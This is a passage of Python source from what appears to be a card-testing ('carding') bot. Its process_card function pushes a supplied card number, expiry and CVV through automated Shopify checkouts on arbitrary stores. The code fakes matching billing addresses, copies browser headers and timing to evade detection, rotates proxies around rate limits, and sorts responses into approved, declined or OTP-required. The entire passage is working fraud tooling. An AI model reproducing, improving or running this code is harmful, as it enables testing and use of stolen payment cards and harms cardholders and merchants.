            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or "USD"
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or "USD"

            # ── Re-pick address to match store currency ──────────────────────
            # Initial pick_addr() defaulted to US. Now that we know the real
            # currency, re-pick a matching address so billing country aligns.
            # This prevents BUYER_IDENTITY_PRESENTMENT_CURRENCY mismatches on
            # non-USD stores (GBP, CAD, AUD, EUR, etc).
            if currency != "USD":
                try:
                    new_addr     = pick_addr(currency)
                    country_code = new_addr["countryCode"]
                    phone        = new_addr["phone"]
                    street       = new_addr["address1"]
                    city         = new_addr["city"]
                    state        = new_addr["zoneCode"]
                    s_zip        = new_addr["postalCode"]
                    print(f"{tag} STEP 2: address re-picked for {currency} → {city}, {country_code}")
                except Exception as _e:
                    print(f"{tag} STEP 2: address re-pick failed ({_e}), keeping US address")

            subtotal = (extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or
                        extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"'))
            if not subtotal:
                pm_m     = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = pm_m.group(1) if pm_m else "0.01"

            # build_id — full 40-char commitSha (confirmed df493021... in HAR)
            build_id = None
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unesc)
            if bm:
                build_id = bm.group(1)
            # fallback: extract from checkout-web JS asset URL
            if not build_id:
                bm2 = re.search(r"checkout-web/assets/([a-f0-9]{40})/", text)
                if bm2:
                    build_id = bm2.group(1)

            # shopify-identification-signature — JWT starting with eyJ
            ident_sig = None
            for sig_pat in [
                r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
                r'callerIdentificationSignature":"([^"]+)"',
                r'"identificationSignature":"([^"]+)"',
                r'shopify-identification-signature["\s:]+([A-Za-z0-9._\-]+)',
            ]:
                im = re.search(sig_pat, unesc)
                if im:
                    ident_sig = im.group(1)
                    break
            if not ident_sig:
                jm = re.search(r'"(eyJ[A-Za-z0-9._\-]{20,})"', unesc)
                if jm:
                    ident_sig = jm.group(1)

            # Build checkout GraphQL headers — exact order and values from HAR
            headers.update({
                "Accept":                    "application/json",
                "Accept-Language":           "en-US",
                "shopify-checkout-client":   "checkout-web/1.0",
                "shopify-checkout-source":   f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "x-checkout-web-source-id":  attempt_token,
                "Referer":         checkout_url,  # full checkout URL as seen in HAR
                "sec-fetch-dest":  "empty",
                "sec-fetch-mode":  "cors",
                "sec-fetch-site":  "same-origin",
                "priority":        "u=1, i",
            })
            if build_id:
                headers["x-checkout-web-build-id"]         = build_id
                headers["x-checkout-web-deploy-stage"]     = "production"
                headers["x-checkout-web-server-handling"]  = "fast"
                headers["x-checkout-web-server-rendering"] = "yes"

            graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/internal/graphql/persisted"
            gql_params  = {"operationName": "Proposal"}

            # ── STEP 3: 5 × Proposal — exact HAR sequence ───────────────────
            # Both HARs show EXACTLY 5 Proposal calls, ALL with identical structure:
            #   destination  = partialStreetAddress  (never changes to streetAddress)
            #   strategy     = deliveryStrategyMatchingConditions {any, any}
            #   targetMerch  = {any: True}
            #   destChanged  = True  (same on all 5)
            # Delivery state progression per response:
            #   P1 → UnavailableTerms  (shipping not loaded yet)
            #   P2 → UnavailableTerms  (still loading)
            #   P3 → PendingTerms      (loading in progress)
            #   P4 → FilledDeliveryTerms ✅
            #   P5 → FilledDeliveryTerms ✅ (confirm)
            # Timing gaps (averaged across both HARs):
            #   P1→P2:  ~3.5s   P2→P3: ~13s   P3→P4: ~1.3s   P4→P5: ~1.3s
            # After P5, Submit fires immediately (no locked proposal).
            json_data = {
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"partialStreetAddress": {
                                "address1": street, "address2": address2, "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": firstName, "lastName": lastName,
                                "zoneCode": state, "phone": phone,
                                "oneTimeUse": False
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                },
                                "options": {}
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {"productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                            }},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": []
                        }]
                    },
                    "memberships": {"memberships": []},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {"streetAddress": {
                            "address1": "", "city": "", "countryCode": country_code,
                            "lastName": "", "zoneCode": state, "phone": ""
                        }}
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "phoneCountryCode": country_code,
                        "marketingConsent": [],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False
                    },
                    "tip": {"tipLines": []},
                    "poNumber": None,
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "shopPayArtifact": {
                        "optIn": {"vaultEmail": "", "vaultPhone": "", "optInSource": "REMEMBER_ME"}
                    },
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "cartMetafields": []
                },
                "operationName": "Proposal",
                "id": PERSISTED_ID_PROPOSAL
            }

            print(f"{tag} STEP 3: Sending 5 Proposals (HAR-exact)...")
            seller_proposal   = None
            delivery_data     = None
            running_total     = "0.00"
            delivery_strategy = ""
            shipping_amount   = 0.0
            tax_amount        = 0.0
            new_qt            = None

            # HAR-exact timing between proposals (averaged from both HARs)
            # P2→P3 gap was 13s in browser — bot breaks early on FilledDeliveryTerms
            # so that 13s is almost never hit. Max wait is 4s per proposal.
            PROPOSAL_DELAYS = [0.8, 1.5, 0.8, 0.8]  # fast bot delays, not browser delays

            for proposal_num in range(5):
                response, resp_text = await make_graphql_request(
                    session, graphql_url, gql_params, headers, json_data, proxy, tag=tag)

                if not response:
                    return False, f"Proposal {proposal_num+1} failed: {resp_text}", gateway, total_price, currency
                if is_captcha_required(resp_text):
                    return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

                try:
                    resp_json = json.loads(resp_text)
                except Exception:
                    return False, f"Invalid JSON on proposal {proposal_num+1}", gateway, total_price, currency

                if "errors" in resp_json:
                    msgs = [e.get("message", str(e)) for e in resp_json.get("errors", [])[:3]]
                    return False, f"GraphQL Error: {'; '.join(msgs)}", gateway, total_price, currency

                try:
                    result = (resp_json.get("data", {})
                              .get("session", {})
                              .get("negotiate", {})
                              .get("result", {}))
                    if not result:
                        return False, f"Null result on proposal {proposal_num+1}", gateway, total_price, currency

                    rt = result.get("__typename", "")
                    if rt == "CheckpointDenied":
                        return False, "Checkpoint Denied", gateway, total_price, currency
                    if rt == "Throttled":
                        return False, "Throttled", gateway, total_price, currency
                    if rt == "NegotiationResultFailed":
                        return False, "Negotiation failed", gateway, total_price, currency

                    checkpoint_data = result.get("checkpointData")
                    sp = result.get("sellerProposal", {})

                    # Chain queueToken into next proposal
                    new_qt = result.get("queueToken")
                    if new_qt:
                        json_data["variables"]["queueToken"] = new_qt

                    # Keep the latest FilledDeliveryTerms — that's the one we need
                    if sp:
                        dl_data = sp.get("delivery")
                        if dl_data and dl_data.get("__typename") == "FilledDeliveryTerms":
                            seller_proposal = sp
                            delivery_data   = dl_data

                    # ── Dynamic subtotal update (from randomscrit.py) ────────
                    # Use the actual merchandise line amount from proposal response
                    # to prevent MERCHANDISE_EXPECTED_PRICE_MISMATCH on submit.
                    if sp:
                        try:
                            merch_terms = sp.get("merchandise", {})
                            if merch_terms and merch_terms.get("__typename") == "FilledMerchandiseTerms":
                                mlines = merch_terms.get("merchandiseLines", [])
                                if mlines:
                                    line_amt = (mlines[0].get("totalAmount", {})
                                                .get("value", {}).get("amount"))
                                    if line_amt:
                                        subtotal = str(line_amt)
                                        # Update the merchandise expectedTotalPrice for next proposal
                                        json_data["variables"]["merchandise"]["merchandiseLines"][0][
                                            "expectedTotalPrice"]["value"]["amount"] = subtotal
                        except Exception:
                            pass

                except (KeyError, TypeError) as e:
                    return False, f"Failed to parse proposal {proposal_num+1}: {e}", gateway, total_price, currency

                dstate = (result.get("sellerProposal") or {}).get("delivery", {}).get("__typename", "?")
                print(f"{tag} P{proposal_num+1}/5: delivery={dstate}  qt_updated={bool(new_qt)}")

                # Break early as soon as we have FilledDeliveryTerms — no need to
                # keep sending proposals once shipping data is available.
                if dstate == "FilledDeliveryTerms" and seller_proposal:
                    print(f"{tag} STEP 3: FilledDeliveryTerms on P{proposal_num+1} — skipping remaining proposals")
                    break

                # Apply delay before next proposal (no delay after last)
                if proposal_num < 4:
                    await asyncio.sleep(PROPOSAL_DELAYS[proposal_num])

            # If we never got FilledDeliveryTerms, use whatever sellerProposal we have
            if not seller_proposal:
                last_sp = (resp_json.get("data", {})
                           .get("session", {})
                           .get("negotiate", {})
                           .get("result", {})
                           .get("sellerProposal", {}))
                if last_sp:
                    seller_proposal = last_sp
                    delivery_data   = last_sp.get("delivery")
                else:
                    return False, "No seller proposal after 5 proposals", gateway, total_price, currency

            # Parse delivery strategy — prefer FREE, else cheapest
            if delivery_data and delivery_data.get("__typename") == "FilledDeliveryTerms":
                dlines = delivery_data.get("deliveryLines", [])
                if dlines:
                    strats = dlines[0].get("availableDeliveryStrategies", []) or []
                    if strats:
                        def _samt(s):
                            try:
                                return float(
                                    s.get("amount", {}).get("value", {}).get("amount", "999999")
                                )
                            except Exception:
                                return 999999.0
                        # Prefer $0 methods first, then lowest paid
                        free = [s for s in strats if _samt(s) <= 0.001]
                        best = free[0] if free else min(strats, key=_samt)
                        delivery_strategy = best.get("handle", "")
                        shipping_amount = _samt(best)
                        if shipping_amount >= 999999.0:
                            shipping_amount = 0.0
                        print(
                            f"{tag} STEP 3: shipping options="
                            f"{[(s.get('title') or s.get('handle', '')[:20], _samt(s)) for s in strats]} "
                            f"→ picked amt={shipping_amount}"
                        )

            running_total_data = seller_proposal.get("runningTotal")
            if not running_total_data:
                return False, "No runningTotal in sellerProposal", gateway, total_price, currency
            running_total = running_total_data["value"]["amount"]

            try:
                tax_data   = seller_proposal.get("tax", {})
                tax_amount = (float(tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0"))
                              if tax_data and tax_data.get("__typename") == "FilledTaxTerms" else 0.0)
            except Exception:
                tax_amount = 0.0

            payment_data = seller_proposal.get("payment", {})
            if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
                for method in payment_data.get("availablePaymentLines", []):
                    pm = method.get("paymentMethod", {})
                    if pm.get("name") or pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm.get("paymentMethodIdentifier")
                        gateway     = pm.get("extensibilityDisplayName") or pm.get("name", "UNKNOWN")
                        total_price = _checkout_total(running_total, shipping_amount, tax_amount)
                        break

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency

            print(f"{tag} STEP 3 done: running_total={running_total} "
                  f"shipping={shipping_amount} tax={tax_amount} strategy={delivery_strategy} gateway={gateway}")

            # ── STEP 3.5: Re-propose with FULL street address to force real tax ──
            # Root cause of "Your order total has changed." on submit:
            #   US stores return tax=0.0 when destination is a partialStreetAddress
            #   (no full street yet). Shopify recomputes destination-based tax at
            #   submit time and rejects if the submitted tax amount doesn't match.
            #
            # Fix: send one more Proposal call with destination.streetAddress
            # (full address, not partial) so Shopify computes real tax and
            # returns FilledTaxTerms. Then use those refreshed amounts in submit.
            #
            # This makes running_total / shipping / tax match what Shopify
            # will charge at submit, eliminating the total-changed rejection.
            try:
                tax_probe = json.loads(json.dumps(json_data))  # deep copy
                tax_probe["variables"]["delivery"]["deliveryLines"][0]["destination"] = {
                    "streetAddress": {
                        "address1": street, "address2": address2, "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": firstName, "lastName": lastName,
                        "zoneCode": state, "phone": phone
                    }
                }
                if delivery_strategy:
                    tax_probe["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy, "customDeliveryRate": False
                        },
                        "options": {"phone": phone}
                    }
                tax_probe["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
                tax_probe["variables"]["payment"]["billingAddress"] = {
                    "streetAddress": {
                        "address1": street, "address2": address2, "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": firstName, "lastName": lastName,
                        "zoneCode": state, "phone": phone
                    }
                }

                _tp_resp, _tp_text = await make_graphql_request(
                    session, graphql_url, gql_params, headers, tax_probe, proxy, tag=tag
                )
                if _tp_resp:
                    _tp_json = json.loads(_tp_text)
                    _tp_result = (_tp_json.get("data", {})
                                  .get("session", {})
                                  .get("negotiate", {})
                                  .get("result", {}))
                    _tp_sp = _tp_result.get("sellerProposal", {})
                    if _tp_sp:
                        # Update queueToken from the fresh response
                        _tp_qt = _tp_result.get("queueToken")
                        if _tp_qt:
                            json_data["variables"]["queueToken"] = _tp_qt

                        # Refresh running total + tax from the tax-aware proposal
                        _tp_rt = _tp_sp.get("runningTotal", {})
                        if _tp_rt:
                            running_total = _tp_rt["value"]["amount"]

                        _tp_tax = _tp_sp.get("tax", {})
                        if _tp_tax and _tp_tax.get("__typename") == "FilledTaxTerms":
                            try:
                                tax_amount = float(
                                    _tp_tax.get("totalTaxAmount", {})
                                    .get("value", {}).get("amount", "0"))
                            except Exception:
                                pass

                        # Refresh shipping from the strategy
                        _tp_dl = _tp_sp.get("delivery", {})
                        if _tp_dl.get("__typename") == "FilledDeliveryTerms":
                            _tp_lines = _tp_dl.get("deliveryLines", [])
                            if _tp_lines:
                                _tp_strats = _tp_lines[0].get("availableDeliveryStrategies", [])
                                for _s in _tp_strats:
                                    if _s.get("handle") == delivery_strategy:
                                        try:
                                            shipping_amount = float(
                                                _s.get("amount", {}).get("value", {}).get("amount", "0"))
                                        except Exception:
                                            pass
                                        break

                        # Recompute the final total with real tax
                        total_price = _checkout_total(running_total, shipping_amount, tax_amount)
                        print(f"{tag} STEP 3.5: tax-aware reproposal → "
                              f"merch={running_total} ship={shipping_amount} "
                              f"tax={tax_amount} total={total_price}")
            except Exception as _tpe:
                print(f"{tag} STEP 3.5: tax reproposal failed ({type(_tpe).__name__}: {_tpe}) — using original totals")

            # ── STEP 4: PCI vault — 4 retries, 5s cooldown on too-many-requests ──
            cc_spaced = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
            vault_payload = {
                "credit_card": {
                    "number": cc_spaced, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None, "start_year": None,
                    "issue_number": "", "name": f"{firstName} {lastName}"
                },
                "payment_session_scope": urlparse(url).netloc
            }
            vault_headers = {
                "Content-Type":    "application/json",
                "Accept":          "application/json",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin":          "https://checkout.pci.shopifyinc.com",
                "Referer":         f"https://checkout.pci.shopifyinc.com/build/{PCI_BUILD_ID}/number-ltr.html?identifier=&locationURL=",
                "User-Agent":      UA,
                "sec-ch-ua":       SEC_CH_UA,
                "sec-ch-ua-mobile":    "?0",
                "sec-ch-ua-platform":  '"Windows"',
                "sec-fetch-dest":  "empty",
                "sec-fetch-mode":  "cors",
                "sec-fetch-site":  "same-origin",
                "sec-fetch-storage-access": "active",
                "priority":        "u=1, i",
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig
            else:
                print(f"{tag} STEP 4: WARNING — ident_sig missing, PCI may rate-limit")

            print(f"{tag} STEP 4: Tokenizing card via PCI...")
            token      = None
            last_error = None
            MAX_PCI    = 4   # 4 total attempts as requested

            for attempt in range(MAX_PCI):
                try:
                    # attempt 0-2 use proxy; attempt 3 goes direct as last resort
                    pci_proxy = proxy if attempt < MAX_PCI - 1 else None
                    pci_resp  = await session.post(
                        "https://checkout.pci.shopifyinc.com/sessions",
                        json=vault_payload, headers=vault_headers, proxy=pci_proxy)

                    if pci_resp.status == 429:
                        # Too many requests — 5s cooldown then retry
                        print(f"{tag} PCI 429 (too many requests) attempt {attempt+1}/{MAX_PCI} — cooldown 5s...")
                        await asyncio.sleep(5)
                        continue

                    if pci_resp.status not in (200, 201):
                        last_error = f"PCI returned HTTP {pci_resp.status}"
                        print(f"{tag} PCI attempt {attempt+1}/{MAX_PCI} bad status {pci_resp.status}")
                        await asyncio.sleep(1)
                        continue

                    try:
                        token_data = await pci_resp.json()
                    except Exception:
                        raw_text   = await pci_resp.text()
                        last_error = f"Unable to parse PCI token response: {raw_text[:100]}"
                        print(f"{tag} PCI attempt {attempt+1}/{MAX_PCI} parse error — cooldown 5s...")
                        await asyncio.sleep(5)
                        continue

                    token = token_data.get("id")
                    print(f"{tag} STEP 4: PCI token={bool(token)} attempt={attempt+1}")
                    if token:
                        break

                    last_error = "Unable to get payment token: id missing in response"
                    await asyncio.sleep(1)

                except (aiohttp.ServerDisconnectedError, aiohttp.ClientOSError,
                        ConnectionResetError) as e:
                    last_error = f"Unable to get payment token: {e}"
                    print(f"{tag} PCI attempt {attempt+1}/{MAX_PCI} connection error: {e} — cooldown 5s...")
                    await asyncio.sleep(5)
                except Exception as e:
                    last_error = f"Unable to get payment token: {e}"
                    print(f"{tag} PCI attempt {attempt+1}/{MAX_PCI} failed: {e}")
                    await asyncio.sleep(1)

            if not token:
                return False, last_error or "Unable to get payment token", gateway, total_price, currency

            # ── STEP 5: SubmitForCompletion ──────────────────────────────────
            submit_variables = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": json_data["variables"]["queueToken"] or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {"streetAddress": {
                                "address1": street, "address2": address2, "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": firstName, "lastName": lastName,
                                "zoneCode": state, "phone": phone
                            }},
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": delivery_strategy or "",
                                    "customDeliveryRate": False
                                },
                                "options": {"phone": phone}
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stableId or "1"}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                            "destinationChanged": False
                        }],
                        "noDeliveryRequired": [], "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None, "supportsSplitShipping": True
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {"productVariantReference": {
                                "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                "properties": [], "sellingPlanId": None, "sellingPlanDigest": None
                            }},
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": []
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_identifier,
                                    "sessionId": token,
                                    "billingAddress": {"streetAddress": {
                                        "address1": street, "address2": address2, "city": city,
                                        "countryCode": country_code, "postalCode": s_zip,
                                        "firstName": firstName, "lastName": lastName,
                                        "zoneCode": state, "phone": phone
                                    }},
                                    "cardSource": None
                                },
                                "giftCardPaymentMethod": None, "redeemablePaymentMethod": None,
                                "walletPaymentMethod": None, "walletsPlatformPaymentMethod": None,
                                "localPaymentMethod": None, "paymentOnDeliveryMethod": None,
                                "paymentOnDeliveryMethod2": None, "manualPaymentMethod": None,
                                "customPaymentMethod": None, "offsitePaymentMethod": None,
                                "customOnsitePaymentMethod": None, "deferredPaymentMethod": None,
                                "customerCreditCardPaymentMethod": None,
                                "paypalBillingAgreementPaymentMethod": None,
                                "remotePaymentInstrument": None
                            },
                            "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                            "dueAt": None
                        }],
                        "billingAddress": {"streetAddress": {
                            "address1": street, "address2": address2, "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": firstName, "lastName": lastName,
                            "zoneCode": state, "phone": phone
                        }},
                        "creditCardBin": cc[:8]
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False, "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"consentState": "GRANTED", "value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None, "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": []
                    },
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
                    },
                    "memberships": {"memberships": []},
                    "cartMetafields": []
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {
                    "requestUrl": checkout_url,
                    "pageId": str(uuid.uuid4()).upper()
                }
            }
            if checkpoint_data:
                submit_variables["input"]["checkpointData"] = checkpoint_data

            # ── Final-total price cap — belt & suspenders ────────────────────
            # STEP 0 capped the merchandise subtotal. This caps the final
            # charged amount (subtotal + shipping + tax) so shipping/tax cannot
            # push the charge above MAX_VARIANT_PRICE.
            try:
                _final_total = float(str(total_price).replace(",", ""))
            except (ValueError, TypeError):
                _final_total = 0.0
            # Forced SKUs may be $1; still block absurd high totals
            _min_ok = MIN_VARIANT_PRICE if not _forced_active else 0.50
            if _final_total < _min_ok or _final_total > MAX_TOTAL_PRICE:
                print(f"{tag} STEP 5: final total {total_price} outside "
                      f"${_min_ok:.2f}-${MAX_TOTAL_PRICE:.2f} — aborting submit")
                return False, "Site not supported", gateway, total_price, currency

            submit_body = {
                "variables": submit_variables,
                "operationName": "SubmitForCompletion",
                "id": PERSISTED_ID_SUBMIT
            }

            print(f"{tag} STEP 5: Submitting for completion...")
            response, text = await make_graphql_request(
                session, graphql_url, {"operationName": "SubmitForCompletion"},
                headers, submit_body, proxy, tag=tag)

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            if "Your order total has changed." in text or "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED" in text or "delivery_line_detail_changed" in text.lower():
                # Shopify recomputed totals or delivery changed between proposal and submit.
                # Retry with fresh session — re-pick address/currency/tax/delivery
                if _cart_attempt == 0:
                    print(f"{tag} STEP 5: delivery/total changed — retrying with fresh session")
                    return await process_card(cc, mes, ano, cvv, site_url,
                                              variant_id=None, proxy_str=proxy_str,
                                              _cart_attempt=_cart_attempt + 1,
                                              _tried_variants=_tried_variants)
                return False, "Your order total has changed", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency

            try:
                resp_json   = json.loads(text)
                submit_data = resp_json.get("data", {}).get("submitForCompletion", {})
                if not submit_data:
                    errors = resp_json.get("errors", [])
                    if errors:
                        for err in errors:
                            code = err.get("code")
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                result_type = submit_data.get("__typename", "")
                print(f"{tag} STEP 5: Submit result_type={result_type}")

                if result_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt = submit_data.get("receipt", {})
                    rt2     = receipt.get("__typename", "") if receipt else ""
                    if rt2 == "ProcessedReceipt":
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    elif rt2 == "FailedReceipt":
                        err   = receipt.get("processingError", {})
                        code  = err.get("code", "") or err.get("__typename", "") or "PAYMENT_FAILED"
                        msg   = err.get("messageUntranslated", "")
                        return True, msg if msg else code, gateway, total_price, currency
                    # ProcessingReceipt / WaitingReceipt → fall through to poll
                    rid = receipt.get("id") if receipt else None
                    if not rid:
                        return False, "No receipt ID after submit", gateway, total_price, currency
                elif result_type == "SubmitFailed":
                    return False, extract_clean_response(submit_data.get("reason", "Unknown")), gateway, total_price, currency
                elif result_type == "SubmitRejected":
                    for err in submit_data.get("errors", []):
                        code       = err.get("code", "")
                        localized  = err.get("localizedMessage", "")
                        nonlocal_  = err.get("nonLocalizedMessage", "")
                        print(f"[SUBMIT REJECTED] code={code!r} msg={localized or nonlocal_!r}")

                        # ── InventoryReservationFailure → fresh variant, same site
                        if code == "InventoryReservationFailure":
                            print(f"{tag} STEP 5: InventoryReservationFailure — fetching fresh variant for {ourl}")
                            fresh_vid = await _fetch_fresh_variant(ourl, proxy_str, exclude_id=variant_id)
                            if fresh_vid:
                                print(f"{tag} STEP 5: got fresh variant {fresh_vid} — restarting checkout on same site")
                                return await process_card(cc, mes, ano, cvv, site_url,
                                                          variant_id=fresh_vid, proxy_str=proxy_str,
                                                          _tried_variants=(_tried_variants or set()) | {str(variant_id)})
                            else:
                                print(f"{tag} STEP 5: no fresh variant found — returning InventoryReservationFailure")
                                return False, "InventoryReservationFailure", gateway, total_price, currency

                        if code in ("GENERIC_ERROR", "PAYMENT_FAILED", ""):
                            detail = localized or nonlocal_
                            if detail:
                                return False, detail, gateway, total_price, currency
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency
                elif result_type == "Throttled":
                    return False, "Throttled", gateway, total_price, currency

                receipt = submit_data.get("receipt", {})
                if not receipt:
                    return False, "No receipt in submit response", gateway, total_price, currency
                rid = receipt.get("id")
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency

            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {e}", gateway, total_price, currency

            # ── STEP 6: PollForReceipt — HAR shows up to 13 polls at ~450ms each ──
            poll_body = {
                "variables": {"receiptId": rid, "sessionToken": sst},
                "operationName": "PollForReceipt",
                "id": PERSISTED_ID_POLL
            }
            await asyncio.sleep(0.5)

            print(f"{tag} STEP 6: Polling for receipt (rid={rid[:30] if rid else 'None'})...")
            final_text = ""
            for i in range(15):
                response, final_text = await make_graphql_request(
                    session, graphql_url,
                    {"operationName": "PollForReceipt"},
                    headers, poll_body, proxy)

                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    poll_json    = json.loads(final_text)
                    receipt_data = poll_json.get("data", {}).get("receipt", {})
                    if receipt_data:
                        typename = receipt_data.get("__typename", "")
                        print(f"{tag} STEP 6: poll {i+1}/15 type={typename}")
                        if typename == "ProcessedReceipt":
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == "FailedReceipt":
                            err   = receipt_data.get("processingError", {})
                            etype = err.get("__typename", "")
                            if etype == "PaymentFailed":
                                code = err.get("code", "")
                                msg  = err.get("messageUntranslated", "")
                                if code in ("GENERIC_ERROR", "PAYMENT_FAILED", "") and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code if code else "PAYMENT_FAILED", gateway, total_price, currency
                            code = err.get("code") or etype or "UNKNOWN_ERROR"
                            # ── InventoryReservationFailure in poll → fresh variant, same site
                            if code == "InventoryReservationFailure":
                                print(f"{tag} STEP 6: InventoryReservationFailure in poll — fetching fresh variant")
                                fresh_vid = await _fetch_fresh_variant(ourl, proxy_str, exclude_id=variant_id)
                                if fresh_vid:
                                    print(f"{tag} STEP 6: retrying with fresh variant {fresh_vid}")
                                    return await process_card(cc, mes, ano, cvv, site_url,
                                                              variant_id=fresh_vid, proxy_str=proxy_str,
                                                              _tried_variants=(_tried_variants or set()) | {str(variant_id)})
                                return False, "InventoryReservationFailure", gateway, total_price, currency
                            return True, code, gateway, total_price, currency
                        elif typename == "ActionRequiredReceipt":
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        elif typename in ("ProcessingReceipt", "WaitingReceipt"):
                            delay = receipt_data.get("pollDelay", 450) / 1000.0
                            await asyncio.sleep(max(0.4, min(delay, 3.0)))
                            continue
                except Exception as _poll_exc:
                    print(f"{tag} STEP 6: poll {i+1}/15 parse error: {_poll_exc}")

                await asyncio.sleep(1.0)

